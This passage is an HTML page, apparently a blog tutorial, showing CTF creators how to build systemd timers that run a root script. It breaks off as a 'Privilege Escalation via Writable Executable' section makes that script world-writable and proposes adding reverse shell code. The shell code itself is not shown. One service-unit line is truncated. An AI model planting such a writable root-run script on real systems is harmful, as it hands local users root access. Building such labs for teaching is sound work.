@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Privilege Escalation - Timers for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-timers/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Linux Privilege Escalation - Timers for CTF Creators">
+  <meta property="og:description" content="Timing sometimes works right? /(*&lt;*)/">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:modified_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Timers">
+    <meta property="article:tag" content="Systemd.timers">
+    <meta property="article:tag" content="Writable Timers">
+    <meta property="article:tag" content="Writable Executables">
+    <meta property="article:tag" content="Defend">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Linux Privilege Escalation - Timers for CTF Creators">
+  <meta name="twitter:description" content="Timing sometimes works right? /(*&lt;*)/">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-timers/" /><link rel="prev" href="//localhost:1313/linux-privesc-capabilities/" /><link rel="next" href="//localhost:1313/linux-privesc-suid-segid/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation - Timers for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/linux-privesc-timers\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "privilege escalation, timers, systemd.timers, writable timers, writable executables, defend","wordcount":  1155 ,
+        "url": "\/\/localhost:1313\/linux-privesc-timers\/","datePublished": "2021-12-28T11:33:00+08:00","dateModified": "2021-12-28T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - Timers for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1155 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#timers">Timers</a>
+      <ul>
+        <li><a href="#systemd-timers-man-page">Systemd Timers Man Page</a></li>
+        <li><a href="#timers-schedule">Timers Schedule</a></li>
+      </ul>
+    </li>
+    <li><a href="#creating-a-utility">Creating a Utility</a></li>
+    <li><a href="#creating-a-service">Creating a Service</a></li>
+    <li><a href="#analyze-timers">Analyze Timers</a></li>
+    <li><a href="#creating-a-timer">Creating a Timer</a></li>
+    <li><a href="#manage-a-timer">Manage a Timer</a></li>
+    <li><a href="#privilege-escalation-via-writable-executable">Privilege Escalation via Writable Executable</a></li>
+    <li><a href="#privilege-escalation-via-writable-timer">Privilege Escalation via Writable Timer</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="timers">Timers</h1>
+<p>Timers are services that perform scheduled tasks at specific time intervals. These could have wrong permissions or could relative paths that could be hijacked.</p>
+<p>Timers can be enumerated with the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">systemctl list-timers --all
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="systemd-timers-man-page">Systemd Timers Man Page</h2>
+<p>The manual page of the systemd.timer is the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">man systemd.timer
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>You can see a table that defines each setting, read it at your own pace if you want to:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">│Setting            │ Meaning                                                      │
+</span></span><span class="line"><span class="cl">├───────────────────┼──────────────────────────────────────────────────────────────┤
+</span></span><span class="line"><span class="cl">│OnActiveSec<span class="o">=</span>       │ Defines a timer relative to the moment the timer unit itself │
+</span></span><span class="line"><span class="cl">│                   │ is activated.                                                │
+</span></span><span class="line"><span class="cl">├───────────────────┼──────────────────────────────────────────────────────────────┤
+</span></span><span class="line"><span class="cl">│OnBootSec<span class="o">=</span>         │ Defines a timer relative to when the machine was booted up.  │
+</span></span><span class="line"><span class="cl">│                   │ In containers, <span class="k">for</span> the system manager instance, this is      │
+</span></span><span class="line"><span class="cl">│                   │ mapped to <span class="nv">OnStartupSec</span><span class="o">=</span>, making both equivalent.             │
+</span></span><span class="line"><span class="cl">├───────────────────┼──────────────────────────────────────────────────────────────┤
+</span></span><span class="line"><span class="cl">│OnStartupSec<span class="o">=</span>      │ Defines a timer relative to when the service manager was     │
+</span></span><span class="line"><span class="cl">│                   │ first started. For system timer units this is very similar   │
+</span></span><span class="line"><span class="cl">│                   │ to <span class="nv">OnBootSec</span><span class="o">=</span> as the system service manager is generally     │
+</span></span><span class="line"><span class="cl">│                   │ started very early at boot. It<span class="err">&#39;</span>s primarily useful when       │
+</span></span><span class="line"><span class="cl">│                   │ configured in units running in the per-user service manager, │
+</span></span><span class="line"><span class="cl">│                   │ as the user service manager is generally started on first    │
+</span></span><span class="line"><span class="cl">│                   │ login only, not already during boot.                         │
+</span></span><span class="line"><span class="cl">├───────────────────┼──────────────────────────────────────────────────────────────┤
+</span></span><span class="line"><span class="cl">│OnUnitActiveSec<span class="o">=</span>   │ Defines a timer relative to when the unit the timer unit is  │
+</span></span><span class="line"><span class="cl">│                   │ activating was last activated.                               │
+</span></span><span class="line"><span class="cl">├───────────────────┼──────────────────────────────────────────────────────────────┤
+</span></span><span class="line"><span class="cl">│OnUnitInactiveSec<span class="o">=</span> │ Defines a timer relative to when the unit the timer unit is  │
+</span></span><span class="line"><span class="cl">│                   │ activating was last deactivated.                             │
+</span></span><span class="line"><span class="cl">└───────────────────┴──────────────────────────────────────
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="timers-schedule">Timers Schedule</h2>
+<p>OnCalendar= Defines real-time (i.e. wallclock) timers with calendar event expressions.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">minutely → *-*-* *:*:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hourly → *-*-* *:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">daily → *-*-* 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">monthly → *-*-01 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">weekly → Mon *-*-* 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">yearly → *-01-01 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">quarterly → *-01,04,07,10-01 00:00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">semiannually → *-01,07-01 00:00:00
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="creating-a-utility">Creating a Utility</h1>
+<p>Create a script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /opt/myscript.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Go into insert mode and write the following code, which prints the date and adds it to the file <code>file.log</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;The date is: </span><span class="k">$(</span>date<span class="k">)</span><span class="s2">&#34;</span> &gt;&gt; /home/low/Documents/file.log
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add execution permissions to the script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo chmod +x /opt/myscript.sh 
+</span></span><span class="line"><span class="cl">ls -l /opt/myscript.sh 
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">75</span> Nov  <span class="m">5</span> 22:32 /opt/myscript.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run the script and check the <code>file.log</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/opt/myscript.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ls -l ~/Documents/
+</span></span><span class="line"><span class="cl">total <span class="m">4</span>
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user <span class="m">45</span> Nov  <span class="m">5</span> 22:32 file.log
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Read the file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat ~/Documents/file.log 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see the date.</p>
+<h1 id="creating-a-service">Creating a Service</h1>
+<p>Create a service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /etc/systemd/system/myscript.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Go into insert mode and add the following instructions to run the script <code>myscript.sh</code> as the root user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>My custom script
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>simple
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/opt/myscript.sh
+</span></span><span class="line"><span class="cl"><span class="nv">User</span><span class="o">=</span>root <span class="c1"># the user that will execute the service</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>gr
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now reload the daemon and start the <code>myscript.service</code> service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl daemon-reload
+</span></span><span class="line"><span class="cl">sudo systemctl start myscript.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Check the status:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl status myscript.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="analyze-timers">Analyze Timers</h1>
+<p>Analyze the timer (this command is not available in Ubuntu 16.04):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">systemd-analyze calendar <span class="s2">&#34;Thu *-*-* 17:00:00&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="creating-a-timer">Creating a Timer</h1>
+<p>Now create a timer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /etc/systemd/system/myscript.timer
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the following instructions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>My custom script
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Timer<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Unit</span><span class="o">=</span>myscript.service
+</span></span><span class="line"><span class="cl"><span class="nv">OnBootSec</span><span class="o">=</span>5min <span class="c1"># 5 minutes after the system boots</span>
+</span></span><span class="line"><span class="cl"><span class="nv">OnUnitActiveSec</span><span class="o">=</span>15min <span class="c1"># Run every 15 minutes after the OnBootSec</span>
+</span></span><span class="line"><span class="cl"><span class="nv">OnCalendar</span><span class="o">=</span>Thu *-*-* 17:00:00   <span class="c1"># DayOfWeek Year-Month-Day Hour:Minute:Second</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Persistent</span><span class="o">=</span><span class="nb">true</span> <span class="c1"># If the computer was turned off and you turn it on, it will run the service. This means that is persistent with reboots.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>timers.target <span class="c1"># Is a target that starts up during boot automatically</span>
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>graphical.target <span class="c1"># Start the timer when the GUI starts</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="manage-a-timer">Manage a Timer</h1>
+<p>Enable a timer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ sudo systemctl daemon-reload
+</span></span><span class="line"><span class="cl">user@pwn:~/Desktop$ sudo systemctl status myscript.timer
+</span></span><span class="line"><span class="cl">● myscript.timer - My custom script
+</span></span><span class="line"><span class="cl">     Loaded: loaded <span class="o">(</span>/etc/systemd/system/myscript.timer<span class="p">;</span> disabled<span class="p">;</span> vendor preset: enable&gt;
+</span></span><span class="line"><span class="cl">     Active: inactive <span class="o">(</span>dead<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Trigger: n/a
+</span></span><span class="line"><span class="cl">   Triggers: ● myscript.service
+</span></span><span class="line"><span class="cl">user@pwn:~/Desktop$ sudo systemctl <span class="nb">enable</span> myscript.timer
+</span></span><span class="line"><span class="cl">Created symlink /etc/systemd/system/timers.target.wants/myscript.timer → /etc/systemd/system/myscript.timer.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Start a timer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl start myscript.timer
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Check the status:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ sudo systemctl status myscript.timer
+</span></span><span class="line"><span class="cl">● myscript.timer - My custom script
+</span></span><span class="line"><span class="cl">     Loaded: loaded <span class="o">(</span>/etc/systemd/system/myscript.timer<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
+</span></span><span class="line"><span class="cl">     Active: active <span class="o">(</span>waiting<span class="o">)</span> since Fri 2021-11-05 22:50:46 PDT<span class="p">;</span> 40s ago
+</span></span><span class="line"><span class="cl">    Trigger: Fri 2021-11-05 22:52:00 PDT<span class="p">;</span> 33s left
+</span></span><span class="line"><span class="cl">   Triggers: ● myscript.service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nov <span class="m">05</span> 22:50:46 ubuntu systemd<span class="o">[</span>1<span class="o">]</span>: Started My custom script.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Look at the trigger to see how much time is left:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Trigger: Fri 2021-11-05 22:52:00 PDT<span class="p">;</span> 33s left
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List all the timers:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ systemctl list-timers --all <span class="p">|</span> grep myscript.timer
+</span></span><span class="line"><span class="cl">n/a                         n/a           Fri 2021-11-05 23:02:00 PDT 3min 15s ago       myscript.timer               myscript.service    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>File timer and service permissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ ls -la /etc/systemd/system/myscript.timer
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">125</span> Nov  <span class="m">5</span> 22:48 /etc/systemd/system/myscript.timer
+</span></span><span class="line"><span class="cl">user@pwn:~/Desktop$ ls -la /etc/systemd/system/myscript.service
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">97</span> Nov  <span class="m">5</span> 22:35 /etc/systemd/system/myscript.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-writable-executable">Privilege Escalation via Writable Executable</h1>
+<p>Add writable permissions to the script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo chmod o+w /opt/elevate.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If the script that&rsquo;s being run by the service is writable, we can just write something malicious to the script like adding a reverse shell code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
